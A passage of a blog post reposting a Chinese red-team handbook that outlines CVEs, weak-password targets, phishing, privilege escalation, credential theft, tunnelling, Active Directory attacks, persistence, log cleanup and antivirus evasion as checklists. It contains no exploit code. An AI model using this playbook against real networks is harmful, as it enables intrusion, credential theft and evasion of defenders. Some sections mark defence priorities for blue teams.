]<br>控制台弱口令,部署webshelll [ 注: 7.x版本后,默认加了防爆机制 ]</p></blockquote></li><li><p>Jekins</p><blockquote><p>CVE-2018-1999002 [任意文件读取]<br>未授权访问,任意命令执行<br>控制台弱口令,任意命令执行</p></blockquote></li><li><p>ElasticSearch</p><blockquote><p>CVE-2014-3120 [专门针对老版本(无沙盒)RCE]<br>CVE-2015-1427 [Groovy RCE]<br>CVE-2015-3337 [任意文件读取]<br>未授权访问,敏感信息泄露</p></blockquote></li><li><p>RabbitMQ</p><blockquote><p>弱口令</p></blockquote></li><li><p>Glassfish</p><blockquote><p>任意文件读取 [ 低版本 ]<br>控制台弱口令,部署webshell</p></blockquote></li><li><p>IBM Websphere</p><blockquote><p>Java 反序列化<br>控制台弱口令,部署webshell</p></blockquote></li><li><p>Axis2</p><blockquote><p>任意文件读取<br>目录遍历</p></blockquote></li><li><p>Apache ActiveMQ</p><blockquote><p>未授权访问,5.12 之前的版本 fileserver存在 PUT任意写<br>CVE-2015-5254</p></blockquote></li><li><p>Apache Solr</p><blockquote><p>CVE-2017-12629<br>CVE-2019-0193 [ Apache Solr 5.x - 8.2.0 ]</p></blockquote></li><li><p>Apache Zookeeper</p><blockquote><p>未授权访问,敏感信息泄露</p></blockquote></li><li><p>Apache Shiro反序列化</p></li><li><p>fastjson &lt;= 1.2.47 反序列化利用</p></li></ul><h4 id="针对各类Windows-php集成环境-由于此类环境拿到的Webshell权限相对较高-所以-通常也是红队人员的首选突破口"><a href="#针对各类Windows-php集成环境-由于此类环境拿到的Webshell权限相对较高-所以-通常也是红队人员的首选突破口" class="headerlink" title="针对各类Windows php集成环境 [ 由于此类环境拿到的Webshell权限相对较高,所以,通常也是红队人员的首选突破口 ]"></a>针对各类Windows php集成环境 [ 由于此类环境拿到的Webshell权限相对较高,所以,通常也是红队人员的首选突破口 ]</h4><blockquote><p>AppServ<br>Xampp<br>宝塔<br>PhpStudy<br>……</p></blockquote><h4 id="针对各类开源程序的-已知Nday漏洞利用"><a href="#针对各类开源程序的-已知Nday漏洞利用" class="headerlink" title="针对各类开源程序的 已知Nday漏洞利用"></a>针对各类开源程序的 已知Nday漏洞利用</h4><blockquote><p>Dedecms        后台弱口令,系列已知nday漏洞利用<br>thinkphp 5.x    后台弱口令,系列已知nday漏洞利用<br>phpcms             后台弱口令,系列已知nday漏洞利用<br>ecshop             后台弱口令,系列已知nday漏洞利用<br>Metinfo         后台弱口令,系列已知nday漏洞利用<br>discuz             后台弱口令,系列已知nday漏洞利用<br>帝国cms         后台弱口令,系列已知nday漏洞利用<br>phpmyadmin         数据库弱口令,系列已知nday漏洞利用<br>wordpress         后台弱口令,系列已知nday漏洞利用<br>joomla             后台弱口令,系列已知nday漏洞利用<br>drupal             CVE-2018-7600 ,后台弱口令,系列已知nday漏洞利用<br>……</p></blockquote><h4 id="针对其它各类Web组件的-已知Nday漏洞利用"><a href="#针对其它各类Web组件的-已知Nday漏洞利用" class="headerlink" title="针对其它各类Web组件的 已知Nday漏洞利用"></a>针对其它各类Web组件的 已知Nday漏洞利用</h4><ul><li><p>IIS 6.0 RCE</p><blockquote><p>短文件漏洞<br>PUT 任意写<br>Webdav RCE CVE-2017-7269</p></blockquote></li><li><p>禅道项目管理系统</p><blockquote><p>SQL注入<br>文件读取<br>远程执行</p></blockquote></li><li><p>通达OA</p><blockquote><p>SQL注入<br>任意上传</p></blockquote></li><li><p>Exchange</p><blockquote><p>利用接口进行邮箱用户名枚举<br>针对各个接口的弱口令爆破<br>CVE-2020-0688 [ 利用前提是需要先得有任意一个邮箱用户权限 ]<br>….</p></blockquote></li><li><p>Zimbra [ XXE + SSRF =&gt; RCE ]</p><blockquote><p>CVE-2013-7091<br>CVE-2016-9924<br>CVE-2019-9670</p></blockquote></li><li><p>Citrix</p><blockquote><p>CVE-2019-19781</p></blockquote></li><li><p>Jumpserver</p><blockquote><p>身份验证绕过</p></blockquote></li><li><p>Zabbix</p><blockquote><p>CVE-2017-2824<br>SQL注入 [ 2.0 老版本 ]<br>控制台弱口令,敏感机器信息泄露</p></blockquote></li><li><p>Cacti</p><blockquote><p>低版本 SQL注入<br>控制台弱口令</p></blockquote></li><li><p>Nagios</p><blockquote><p>CVE-2016-9565<br>控制台弱口令</p></blockquote></li><li><p>Webmin RCE</p><blockquote><p>CVE-2019-15107</p></blockquote></li><li><p>PHPMailer</p><blockquote><p>CVE-2016-10033</p></blockquote></li><li><p>泛微OA远程代码执行</p></li><li><p>金蝶OA SQL注入</p></li><li><p>Coremail 敏感文件泄露</p></li><li><p>UEditor 任意文件上传</p></li><li><p>OpenSSL心脏滴血抓明文账号密码 [ Heartbleed ]</p></li><li><p>破壳漏洞 [ Shellshock ]</p></li></ul><h4 id="各种能快速getshell的常规基础Web漏洞利用-注-有些漏洞在不审代码的情况下其实是很难有效盲测到的"><a href="#各种能快速getshell的常规基础Web漏洞利用-注-有些漏洞在不审代码的情况下其实是很难有效盲测到的" class="headerlink" title="各种能快速getshell的常规基础Web漏洞利用 [ 注: 有些漏洞在不审代码的情况下其实是很难有效盲测到的 ]"></a>各种能快速getshell的常规基础Web漏洞利用 [ 注: 有些漏洞在不审代码的情况下其实是很难有效盲测到的 ]</h4><blockquote><p>后台弱口令<br>SSRF<br>sql注入<br>越权<br>命令 / 代码执行 / 反序列化<br>任意文件上传 / 下载 / 读取<br>包含<br>XSS（实际上,XSS只有在针对某些特定邮箱,手里有浏览器0day时价值才会比较大,红队场景下其实并不是非常致命)<br>业务逻辑漏洞</p></blockquote><p>针对各类边界网络设备的各种利用,主要是Web管理控制台登录弱口令及 各类已知nday攻击利用</p><ul><li><p>Pulse Secure VPN</p><blockquote><p>CVE-2019-11510 [ 任意文件读取 ]</p></blockquote></li><li><p>Fortinet VPN</p><blockquote><p>CVE-2018-13379 [ 文件读取 ]</p></blockquote></li><li><p>Sangfor Vpn RCE</p></li></ul><h3 id="0x03-入口权限获取-专门针对各类基础服务端口的各种getshell利用，防御重点-“重中之重”"><a href="#0x03-入口权限获取-专门针对各类基础服务端口的各种getshell利用，防御重点-“重中之重”" class="headerlink" title="0x03 入口权限获取[专门针对各类基础服务端口的各种getshell利用，防御重点 ( “重中之重” )]"></a>0x03 入口权限获取[专门针对各类基础服务端口的各种getshell利用，防御重点 ( “重中之重” )]</h3><blockquote><p>此处仅仅只挑选了一些实战中真正能协助快速getshell的服务,其它的一些相对边缘性的服务均未提及,同样,已按 “实际攻击利用的难易程度” 及 “获取到的shell权限高低”为标准进行了详细排序如下,就每个端口的具体攻击利用方式,进行了简要说明</p></blockquote><ul><li>Top Port List<blockquote><p>Mssql       [ 默认工作在tcp 1433端口, 弱口令, 敏感账号密码泄露, 提权, 远程执行, 后门植入 ]<br>SMB       [ 默认工作在tcp 445端口, 弱口令, 远程执行, 后门植入 ]<br>WMI       [ 默认工作在tcp 135端口, 弱口令, 远程执行, 后门植入 ]<br>WinRM      [ 默认工作在tcp 5985端口,此项主要针对某些高版本Windows, 弱口令, 远程执行, 后门植入 ]<br>RDP       [ 默认工作在tcp 3389端口, 弱口令, 远程执行, 别人留的shift类后门 ]<br>SSH       [ 默认工作在tcp 22端口, 弱口令, 远程执行, 后门植入 ]<br>ORACLE    [ 默认工作在tcp 1521端口, 弱口令, 敏感账号密码泄露, 提权, 远程执行, 后门植入 ]<br>Mysql     [ 默认工作在tcp 3306端口, 弱口令, 敏感账号密码泄露, 提权(只适用于部分老系统) ]<br>REDIS      [ 默认工作在tcp 6379端口, 弱口令, 未授权访问, 写文件(webshell,启动项,计划任务), 提权 ]<br>POSTGRESQL[ 默认工作在tcp 5432端口, 弱口令, 敏感信息泄露 ]<br>LDAP      [ 默认工作在tcp 389端口, 未授权访问, 弱口令, 敏感账号密码泄露 ]<br>SMTP      [ 默认工作在tcp 25端口, 服务错误配置导致的用户名枚举漏洞, 弱口令, 敏感信息泄露 ]<br>POP3      [ 默认工作在tcp 110端口, 弱口令, 敏感信息泄露 ]<br>IMAP      [ 默认工作在tcp 143端口, 弱口令, 敏感信息泄露 ]<br>Exchange  [ 默认工作在tcp 443端口, 接口弱口令爆破 eg: Owa,ews,oab,AutoDiscover… pth脱邮件, 敏感信息泄露 … ]<br>VNC       [ 默认工作在tcp 5900端口, 弱口令 ]<br>FTP       [ 默认工作在tcp 21端口, 弱口令, 匿名访问/可写, 敏感信息泄露 ]<br>Rsync     [ 默认工作在tcp 873端口, 未授权, 弱口令, 敏感信息泄露 ]<br>Mongodb   [ 默认工作在tcp 27017端口, 未授权, 弱口令 ]<br>TELNET    [ 默认工作在tcp 23端口, 弱口令, 后门植入 ]<br>SVN       [ 默认工作在tcp 3690端口, 弱口令, 敏感信息泄露 ]<br>JAVA RMI  [ 默认工作在tcp 1099端口, 可能存在反序列化利用 ]<br>CouchDB   [ 默认工作在tcp 5984端口, 未授权访问 ]</p></blockquote></li></ul><h3 id="0x04-入口权限获取"><a href="#0x04-入口权限获取" class="headerlink" title="0x04 入口权限获取"></a>0x04 入口权限获取</h3><blockquote><p>传统钓鱼攻击利用，实际护网场景中用的非常频繁，细节非常多，此处不一一列举，防御重点</p></blockquote><ul><li><p>发信前期准备</p><blockquote><p>枚举有效的目标邮箱用户名列表<br>批量探测目标邮箱弱口令<br>伪造发信人 [ 发信邮服搭建 ]<br>钓鱼信 [ 针对不同行业一般也都会事先准备好各种各样的针对性的发信话术模板,以此来提到实际发信成功率 ]<br>……</p></blockquote></li><li><p>典型投递方式</p></li></ul><p>第一种,直接给目标发送各种常规木马信</p><blockquote><p>传统宏利用<br>捆绑<br>exe[zip,7z]<br>lnk<br>chm<br>自解压<br>木马链接<br>OLE<br>CVE-2017-11882 [ 利用漏洞触发 ]<br>…</p></blockquote><p>第二种,给目标发送各种钓鱼链接,比如, 利用各种目标登录口的钓鱼页面来窃取各种内网账号密码</p><blockquote><p>Vpn<br>Mail<br>OA<br>Net ntlm hash [ 远程模板注入,pdf…钓hash,国内ISP过滤SMB流量不适用 ]<br>……</p></blockquote><h3 id="0x05-主机安全-提权利用，防御重点"><a href="#0x05-主机安全-提权利用，防御重点" class="headerlink" title="0x05 主机安全 [ 提权利用，防御重点 ]"></a>0x05 主机安全 [ 提权利用，防御重点 ]</h3><blockquote><p>以下只单独挑了一些在 通用性, 稳定性, 易用性, 实际成功率都相对较好的洞和方式,其它的一些”边缘性”的利用都暂未提及</p></blockquote><ul><li><p>Windows 系统漏洞 本地提权 [ 成功的前提是,保证事先已做好各种针对性免杀 ]</p><blockquote><p>BypassUAC [ win7 / 8  / 8.1 / 10 ]<br>MS14-058[KB3000061]                    [重点]<br>MS14-068[KB3011780]                    [重点]<br>ms15-051[KB3045171]                    [重点]<br>MS15-077[KB3077657]                    [重点]<br>MS16-032[KB3124280]                    [重点]<br>ms16-075                        [重点]<br>MS16-135[KB3199135]                    [重点]<br>MS17-010[KB4013389]                    [重点]<br>cve-2019-0708                        [重点]<br>CVE-2019-0803                        [重点]<br>CVE-2019-1322 &amp; CVE-2019-1405                [重点]<br>cve-2019-12750 [ 赛门铁克(用的较多)本地提权 ]        [重点]        </p></blockquote></li><li><p>linux 内核漏洞 本地提权 [ linux-exploit-suggester ]</p><blockquote><p>CVE-2016-5195                        [重点]<br>CVE-2017-16995<br>CVE-2019-13272</p></blockquote></li><li><p>利用各类第三方服务 / 软件工具提权</p><blockquote><p>Mssql                             [重点]<br>Oracle                                 [重点]<br>Mysql<br>各类第三方软件dll劫持                     [重点]<br>suid权限<br>计划任务<br>各种错误服务配置利用</p></blockquote></li></ul><h3 id="0x06-内网安全-敏感信息搜集，防御重点，可在此项严格限制各种系统内置命令执行"><a href="#0x06-内网安全-敏感信息搜集，防御重点，可在此项严格限制各种系统内置命令执行" class="headerlink" title="0x06 内网安全 [ 敏感信息搜集，防御重点，可在此项严格限制各种系统内置命令执行 ]"></a>0x06 内网安全 [ 敏感信息搜集，防御重点，可在此项严格限制各种系统内置命令执行 ]</h3><ul><li>搜集当前已控”跳板机”的各类敏感信息</li></ul><blockquote><p>注: 如下某些操作肯定是需要事先自己想办法先拿到管理权限后才能正常进行的,此处不再赘述</p></blockquote><blockquote><p>查看当前shell权限 及 详细系统内核版本<br>获取当前系统的 详细ip配置,包括 所在域, ip, 掩码, 网关, 主备 dns ip<br>获取当前系统最近的用户登录记录<br>获取当前用户的所有命令历史记录 [ 主要针对linux,里面可能包含的有各类敏感账号密码,ip,敏感服务配置… ]<br>获取本机所有 服务/进程 [包括各个进程的详细权限,也包括目标系统中的可疑恶意进程(有可能是同行的马)]/端口/网络连接信息<br>获取本机所用杀软 / 监控种类 [ 后续好针对性的做免杀 ]<br>获取本机 rdp / ssh 端口开启状态 及 其默认端口号<br>获取本机所有用户的rdp外连记录<br>获取本机的所有SSH登录记录<br>获取当前系统所有登录成功的日志 [ 针对windows ]<br>获取本机所有已安装软件的详细列表 [ 主要为抓密码,提权,留后门做准备 ]<br>获取本机各个浏览器中保存的 所有书签页 及 历史浏览记录<br>获取当前用户创建的所有计划任务列表 及 计划任务所对应的执行脚本内容 [ 有些执行脚本中很可能存的有各种连接账号密码 ]<br>获取当前用户 桌面 及 回收站 里的所有文件列表<br>获取当前系统的所有存在suid权限的二进制程序<br>获取当前系统代理 [ ip &amp; 端口 ]<br>获取当前系统所有的自启动注册表项值<br>获取当前系统的所有 ipc 连接 及 已启用共享<br>获取当前系统的所有挂载[mount]<br>获取当前系统的防火墙状态<br>获取当前系统所有分区/盘符及其详细使用情况<br>获取本机的累计开机时长<br>获取本机arp / dns缓存<br>获取当前机器环境变量 [ 主要想看看目标机器上有无python,jdk,ruby…等语言的执行环境,后期可设法利用 ]<br>获取当前系统所有本地用户及组列表<br>获取当前系统host文件内容<br>获取当前机器硬件设备信息[ 主要为判断当前机器是否为虚拟机 ]<br>远程截屏捕捉目标用户敏感操作</p></blockquote><blockquote><p>由于上述大部分的搜集动作都是基于系统内置工具和接口,故,可完全依靠EDR来实时捕捉各类敏感进程上报恶意操作</p></blockquote><ul><li><p>利用当前已控 “跳板机”, 分析目标内网大致网络拓扑及所有关键性业务机器分布</p></li><li><p>批量抓取内网所有windows机器名 和 所在 “域” / “工作组名” [smb探测扫描]</p></li><li><p>针对内网的各种高危敏感服务定位[“安全” 端口扫描 (在避免对方防护报警拦截的情况下进行各种常规服务探测识别)]</p></li><li><p>内网批量 Web Banner 抓取,获取关键目标业务系统如下</p><blockquote><p>内网各种文件[共享]服务器<br>内网各类web服务器  [ 可用于后期留入口 ]<br>内网各类数据库服务器<br>内网邮件服务器  [ 可用于后期留入口 ]<br>内网Vpn服务器  [ 可用于后期留入口 ]<br>内网各类常规资产状态监控服务器,eg: zabbix,nagios,cacti…<br>内网各类防护的主控端,比如,防火墙,EDR,态势感知 产品的web主控端…<br>内网日志服务器<br>内网补丁服务器<br>内网各类OA,ERP,CRM,SRM,HR系统…<br>内网打印服务器<br>内网 MES 系统<br>内网虚拟化服务器 / 超融合平台 [Vmware ESX]<br>内网堡垒机…<br>内网运维,研发 部门员工的机器<br>内网路由,交换设备…<br>等等等<br>…<br>针对以上的各种常规内网探测扫描,其实在流量上都会有非常清晰的表现<br>通过在一些关键节点设备/服务器上部署探针搜集流量,再配合大数据关联分析查找各种敏感特征,理论上是相对容易发现各类扫描探测痕迹的,</p></blockquote></li><li><p>针对各类已知系统高危RCE漏洞的批量探测识别与利用</p><blockquote><p>MS08-067 [ 其实,某些特殊行业的系统可能非常老,极少更新,故,还是有存在的可能 ]<br>MS17-010<br>CVE-2019-0708<br>其实针对此类漏洞的攻击利用识别,就显得比较直白了,通过深入分析每种漏洞在实际攻击利用过程所产生的一些典型流量特征和系统日志即可大致判断</p></blockquote></li></ul><h3 id="0x07-内网安全-各类敏感凭证-“搜集”-与-“窃取”"><a href="#0x07-内网安全-各类敏感凭证-“搜集”-与-“窃取”" class="headerlink" title="0x07 内网安全 [ 各类敏感凭证 “搜集” 与 “窃取” ]"></a>0x07 内网安全 [ 各类敏感凭证 “搜集” 与 “窃取” ]</h3><ul><li><p>主动密码搜集</p><blockquote><p>注:如下某些操作肯定是需要事先自己想办法先拿到管理权限或者在指定用户权限下才能正常进行的<br>此处不再赘述, 此项非防御重点, 因为压根也不好防<br>批量抓取当前机器上的 “各类基础服务配置文件中保存的各种账号密码”<br> 比如,各种数据库连接配置文件,各类服务自身的配置文件(redis,http basic…)…<br>想办法 “控制目标 运维管理 / 技术人员 的单机,从这些机器上去搜集可能保存着各类敏感网络资产的账号密码表”<br> 比如, <em>.ls,</em>.doc,*.docx, *.txt….<br>抓取各类 “数据库客户端工具中保存各种数据库连接账号密码<br> 比如,Navicat,SSMS[MSSQL自带客户端管理工具,里面也可能保存的有密码(加密后的base64)]<br>抓取当前系统 “注册表中保存的各类账号密码hash” [ Windows ]<br>抓取当前系统所有 “本地用户的明文密码/hash” [ Windows &amp; linux ]<br>抓取当前系统的所有 “用户token” [ Windows ]<br>抓取 “windows凭据管理器中保存的各类连接账号密码”<br>抓取 “MSTSC 客户端中保存的所有rdp连接账号密码”<br>抓取各类 “VNC客户端工具中保存的连接密码”<br>抓取 “GPP目录下保存的各类账号密码” [ 包括组策略目录中XML里保存的密码hash 和 NETLOGON目录下的某些脚本中保存的账号密码 ]<br>抓取各类 “SSH客户端工具中保存的各种linux系统连接账号密码”, SecureCRT,Xshell,WinSCP,putty<br>抓取各类 “浏览器中保存的各种web登录密码”,Chrome [360浏览器],Firefox,IE,QQ浏览器<br>抓取各类 “数据库表中保存的各类账号密码hash”<br>抓取各类 “FTP客户端工具中保存的各种ftp登录账号密码”, filezila, xftp…<br>抓取各类 “邮件客户端工具中保存的各种邮箱账号密码”, forxmail, thunderbird…<br>抓取各类 “SVN客户端工具中保存的所有连接账号密码及项目地址”<br>抓取各类 “VPN客户端工具中保存的各种vpn链接账号密码”</p></blockquote></li><li><p>被动密码搜集 [ 等着管理员自己来送密码 ]</p><blockquote><p>[注: 某些操作肯定是需要事先自己想办法先拿到管理权限后才能正常进行的, 此处不再赘述 , 是防御重点]<br>Windows SSP [持久化/内存]<br>Hook PasswordChangeNotify [持久化/内存]<br>OWA 登录账号密码截获<br>截获mstsc.exe中输入的rdp连接账号密码<br>linux 别名记录利用<br>本机明文密码嗅探 [ http,ftp,pop3… ]<br>传统键盘记录<br>windows蓝屏技巧 [ 此操作主要为应对不时之需,比如,搞蓝屏,登管理员登录抓密码 ]</p></blockquote></li><li><p>Hash爆破:</p><blockquote><p>Hashcat [ 完全拼GPU ]</p></blockquote></li></ul><h3 id="0x08-内网安全-内网常用-“隧道””-“转发””-“代理””-穿透手法-提炼汇总-，防御重点"><a href="#0x08-内网安全-内网常用-“隧道””-“转发””-“代理””-穿透手法-提炼汇总-，防御重点" class="headerlink" title="0x08 内网安全 [ 内网常用 “隧道”” / “转发”” / “代理”” 穿透手法 提炼汇总 ，防御重点 ]"></a>0x08 内网安全 [ 内网常用 “隧道”” / “转发”” / “代理”” 穿透手法 提炼汇总 ，防御重点 ]</h3><blockquote><p>出网流量刺探<br>比如,http,dns,以及一些穿透性相对较好的tcp端口…<br>这种操作一般都会配合wmi,smb,ssh远程执行,在内网批量快速识别出能出网的机器</p></blockquote><blockquote><p>常规 HTTP脚本代理<br>abptts,Neo-reGeorg,reGeorg,tunna,reduh…<br>不得不说,公开脚本在实战中多多少少都会有些问题,还需要根据自己的实际目标环境深度改进才行</p></blockquote><blockquote><p>SSH 隧道<br>加密端口转发,socks 实战用途非常灵活,此处不细说 ]</p></blockquote><blockquote><p>Rdp 隧道</p></blockquote><blockquote><p>反向SOCKS<br>nps, frp, ssf, CobaltStrike(socks4a &amp; rportfwd ), sscoks …<br>工具基本都不免杀了,需要自行处理</p></blockquote><blockquote><p>正反向TCP 端口转发<br>非常多,就不一一列举, eg: nginx,netsh,socat,ew….</p></blockquote><blockquote><p>DNS加密隧道            </p></blockquote><blockquote><p>Web端口复用</p></blockquote><blockquote><p>需要明白的是,在一般的红队场景中<br>入侵者为了尽可能躲避各种检测设备的流量解析,很多此类工具都会采用各种各样的方式来加密传输流量,以此来保证自己有更强的穿透性</p></blockquote><h3 id="0x09-域内网安全-域内常用攻击手法-域渗透-，提炼汇总，防御重点"><a href="#0x09-域内网安全-域内常用攻击手法-域渗透-，提炼汇总，防御重点" class="headerlink" title="0x09 域内网安全 [ 域内常用攻击手法 ( 域渗透 )，提炼汇总，防御重点 ]"></a>0x09 域内网安全 [ 域内常用攻击手法 ( 域渗透 )，提炼汇总，防御重点 ]</h3><ul><li><p>针对当前域的一些常规信息搜集[ 其实现实中,只需要一个BloodHound &amp; Pingcastle足矣,就是工具需要自行事先免杀好]</p><blockquote><p>获取当前域内的完整域管列表<br>获取当前域内的所有域控机器名列表<br>获取当前域内的所有DNS服务器机器名列表<br>获取当前域内的所有SPN<br>获取当前域内的所有OU<br>获取当前域内的所有用户 &amp; 用户组列表<br>获取当前域信任关系 [ 跨域渗透 ]<br>获取当前域内所有机器的开机时间<br>获取当前域内网段及web站点<br>获取当前域内策略 [ 主要是为了了解密码策略 ]<br>获取当前域林<br>…….</p></blockquote></li><li><p>快速获取目标域控权限的一些常规手法</p><blockquote><p>搜集GPP 目录 [ 其中可能保存的有域账号密码,不仅仅是存在XML里的那些,NETLOGON目录中的某些脚本同样也可能保存有账号密码 ]<br>服务票据hash破解(“尤其是域管用户的”) [ kerberoast ]<br>批量对域用户进行单密码尝试 [ 喷射,利用ADSI接口,日志id 4771 ]<br>Kerberos 委派利用<br>爆破LDAP<br>Exchange特定ACL滥用<br>SSP 截获关键服务器登录密码<br>利用各类基础服务在内网快速 getshell [ 弱口令, 各类JAVA中间件已知Nday漏洞, 常规Web漏洞… ],在内网循环抓各类密码,直至<br>抓到域管密码<br>抓到域管令牌<br>DNSAdmin 组成员滥用 [ 加载执行恶意dll ]<br>LAPS<br>MS14-068 [ 如今实际中已很少遇到了 ]<br>LLMNR/NBNS欺骗  + SMB relay [ 真实在实战中其实用的并不多 ]</p></blockquote></li><li><p>域内后渗透敏感信息搜集分析</p><blockquote><p>获取所有DNS记录<br>导出当前域的完整LDAP数据库<br>提取当前域的ntds.dit [ 域内账号密码数据库 ]<br>Dcsync同步<br>Volume Shadow Copy Service</p></blockquote></li><li><p>域内指定用户登录ip定位</p><blockquote><p>利用OWA登录日志<br>利用域控服务器登录日志<br>指定服务银票 [ Silver Ticket ]<br>除此之外,就是下面的各类常规横向手法</p></blockquote></li><li><p>域内指定用户机器定向控制技巧</p><blockquote><p>绑定用户登录脚本<br>利用GPO下发 [实际上,利用GPO能做的事情还非常非常多]<br>PTT [ 票据传递 ]</p></blockquote></li><li><p>针对域管的各种权限维持技巧</p><blockquote><p>金票<br>Skeleton Key<br>DSRM密码同步<br>OWA后门<br>…</p></blockquote></li><li><p>域内Exchange 邮件数据脱取</p><blockquote><p>利用Ews接口通过PTH的方式脱邮件</p></blockquote></li></ul><h3 id="0x10-内网安全-跨平台横向渗透-远程执行-，防御重点-“重中之重”"><a href="#0x10-内网安全-跨平台横向渗透-远程执行-，防御重点-“重中之重”" class="headerlink" title="0x10 内网安全 [ 跨平台横向渗透 (远程执行)，防御重点 ( “重中之重” ) ]"></a>0x10 内网安全 [ 跨平台横向渗透 (远程执行)，防御重点 ( “重中之重” ) ]</h3><ul><li><p>从 Windows平台 横向至 Windows平台</p><blockquote><p>注: 以下某些远程执行方式, 即可直接用明文账号密码 亦可 基于pth来进行, 不局限<br>远程服务管理 [ SCM ]<br>远程创建执行计划任务 [ Scheduled Tasks ]<br>WMI 远程执行 [ WMI ]<br>针对高版本Windows 的WinRM 远程执行<br>DCOM 远程执行 [ 需要目标Windows机器事先已关闭防火墙 ]<br>高版本 RDP 远程执行<br>利用MSSQL数据库存储过程来变相远程执行<br>利用Oracle数据库存储过程来变相远程执行<br>SMB [ PTH (hash传递) ]<br>RDP[MSTSC] 反向渗透 [ 即可用于突破某些隔离, 亦可通过云(Windows vps)直接反控目标管理员个人机 CVE-2019-0887 ]<br>利用补丁服务器下发执行<br>利用EDR主控端定向下发执行</p></blockquote></li><li><p>从 Windows平台 横向至 *inux平台</p><blockquote><p>plink 或者 基于Windows SSH库自行开发各种远程执行小工具<br>从 *inux平台 横向至 Windows 平台<br>一般都会将 impacket套件中的各个常用py脚本事先直接打包成可执行文件, 然后丢到目标linux系统中去执行,如下<br>wmiexec_linux_x86_64<br>smbexec_linux_x86_64<br>psexec_linux_x86_64<br>atexec_linux_x86_64<br>dcomexec_linux_x86_64<br>另外,还有一些基于go的工具,同样也可以编译成可执行文件之后再丢上去执行</p></blockquote></li><li><p>从 *inux平台 横向至 *inux 平台</p><blockquote><p>linux 自带的ssh客户端工具套件, 默认就可以用来进行远程执行</p></blockquote></li><li><p>各种远程下载技巧</p><blockquote><p>wget [ win &amp; linux ]<br>curl [ win &amp; linux ]<br>之所以没着重提以下这些系统内置的远程下载执行工具,主要还是因为事先已经明确知道<br>某些杀软环境下它肯定会被拦截,所以事先就直接把它弃用了,尤其针对红队这种场景,这些东西根本不在乎多,有一个能用好用的即可<br>CertUtil.exe<br>Bitsadmin.exe<br>Regsvr32.exe<br>Rundll32.exe<br>Powershell.exe<br>……</p></blockquote></li></ul><h3 id="0x11-内网安全-权限维持，防御重点-注-有些细节此处并未展开详细说明"><a href="#0x11-内网安全-权限维持，防御重点-注-有些细节此处并未展开详细说明" class="headerlink" title="0x11 内网安全 [ 权限维持，防御重点 ] [ 注: 有些细节此处并未展开详细说明 ]"></a>0x11 内网安全 [ 权限维持，防御重点 ] [ 注: 有些细节此处并未展开详细说明 ]</h3><ul><li><p>边界入口权限维持</p><blockquote><p>OWA 登录口 [ 账号密码,webshell ]<br>VPN 登录口 [ 账号密码,shell ]<br>其他 MAIL 登录口 [ 账号密码 ]<br>边界 Web服务器 [ Webshell 驻留技巧 ]<br>边界路由交换设备 [ 账号密码,shell ]<br>…</p></blockquote></li><li><p>Windows 单机系统维持 [临时]</p><blockquote><p>系统计划任务 [ 高权限/低权限 ]<br>常规注册表自启动项 [ 用户权限/system权限 ]<br>Mssql存储过程 [ 继承服务权限 ]<br>WMI<br>Winlogon<br>CLR<br>Logon Scripts<br>MruPidlList<br>Mof<br>传统远控<br>…</p></blockquote></li><li><p>linux 单机系统维持 [临时]</p><blockquote><p>Patch SSH<br>替换各类基础服务so [ PAM,Nginx,Rsync …]<br>系统计划任务<br>传统应用层远控<br>驱动层远控( 针对特定内核版本 )</p></blockquote></li></ul><h3 id="0x12-痕迹处理"><a href="#0x12-痕迹处理" class="headerlink" title="0x12 痕迹处理"></a>0x12 痕迹处理</h3><blockquote><p>web日志 [ 访问, 错误日志 ]<br>数据库日志 [ 异常连接日志,慢查询日志 ]<br>系统各类安全日志 [ ssh,rdp,smb,wmi,powershell….]<br>各类邮箱登录日志<br>域内敏感攻击利用日志 [ 金票,银票… ]<br>此项为专业蓝队范畴,不再赘述<br>……</p></blockquote><h3 id="0x13-各类常用-C2-渗透-框架"><a href="#0x13-各类常用-C2-渗透-框架" class="headerlink" title="0x13 各类常用 C2 / 渗透 框架"></a>0x13 各类常用 C2 / 渗透 框架</h3><blockquote><p>CobaltStrike [二次开发]<br>  payload(beacon) 逆向/改进重写<br>Metasploit [二次开发]<br>……</p></blockquote><h3 id="0x14-各类常用-Webshell管理工具"><a href="#0x14-各类常用-Webshell管理工具" class="headerlink" title="0x14 各类常用 Webshell管理工具"></a>0x14 各类常用 Webshell管理工具</h3><blockquote><p>菜刀    caidao20160622<br>冰蟹    Behinder_v2.0.1<br>蚁剑    AntSword<br>……</p></blockquote><h3 id="0x15-免杀-及-各类防火墙对抗"><a href="#0x15-免杀-及-各类防火墙对抗" class="headerlink" title="0x15 免杀 及 各类防火墙对抗"></a>0x15 免杀 及 各类防火墙对抗</h3><ul><li><p>静态</p><blockquote><p>混淆:<br>手工混淆,有源码的情况下,尝试逐个替换可能是关键特征字符串的 命名空间名, 函数名, 变量名, 字符串 等等等….<br>工具混淆,针对各种语言的专业混淆工具 [ 有商业版 ]<br>…<br>加壳:<br>一些常用公开壳的实际效果可能并不是太好 [ 也有商业壳 ]<br>最好的方式还是尝试自己写壳,就是成本较高<br>…</p></blockquote></li><li><p>动态</p><blockquote><p>反射<br>shellcode 内存加解密执行 ( 对于现在的某些杀软来讲,可能并没什么卵用,别人拦的基本都是你的最终调用 )<br>白利用<br>……<br>注:<br> 理论上, 这些应该也没有什么非常通用的方法<br> 大多还是事先针对特定的杀软针对性的不停调试分析出它到底怎么拦,怎么查的,然后再针对性的对症下药</p></blockquote></li><li><p>流量:</p><blockquote><p>域前置[利用大厂cdn]<br>DNS加密隧道<br>第三方公共邮箱上线<br>第三方网盘上线<br>第三方社交网站上线<br>第三方匿名社交工具上线[eg: tg机器人,tor…]</p></blockquote></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;HW弹药库之红队作战手册&quot;&gt;&lt;a href=&quot;#HW弹药库之红队作战手册&quot; class=&quot;headerlink&quot; title=&quot;HW弹药库之红队作战手册&quot;&gt;&lt;/a&gt;HW弹药库之红队作战手册&lt;/h1&gt;&lt;hr&gt;
&lt;p&gt;本文来自klionsec的github&lt;/p&gt;
&lt;h2 id=&quot;说明&quot;&gt;&lt;a href=&quot;#说明&quot; class=&quot;headerlink&quot; title=&quot;说明&quot;&gt;&lt;/a&gt;说明&lt;/h2&gt;&lt;blockquote&gt;
